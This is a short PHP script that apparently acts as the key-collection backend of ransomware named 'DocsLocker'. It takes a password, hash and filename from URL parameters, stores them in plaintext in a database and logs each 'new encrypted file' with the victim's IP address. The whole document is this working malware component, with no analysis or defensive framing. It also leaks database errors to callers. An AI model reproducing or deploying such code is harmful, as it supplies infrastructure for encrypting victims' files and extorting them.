<?php

include 'database.php';

$password = $_GET["pass"];
$hash = $_GET["hash"];
$filename = $_GET["filename"];

try {
    $db = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_password);

    $db->query('create table if not exists files (id int primary key auto_increment, name varchar(64) not null, hash varchar(64) not null, password varchar(64) not null, created_at timestamp)');

    $stmt = $db->prepare('insert into files (name, hash, password) values (?, ?, ?)');
    $stmt->execute([$filename, $hash, $password]);

    file_put_contents("events.log", "\e[92m[DocsLocker]\e[0m New encrypted file: \e[93m" . $filename . "\e[0m from IP: \e[36m" . $_SERVER["REMOTE_ADDR"] . "\e[0m\n", FILE_APPEND);

} catch (\PDOException $e) {
    echo $e->getMessage();
}



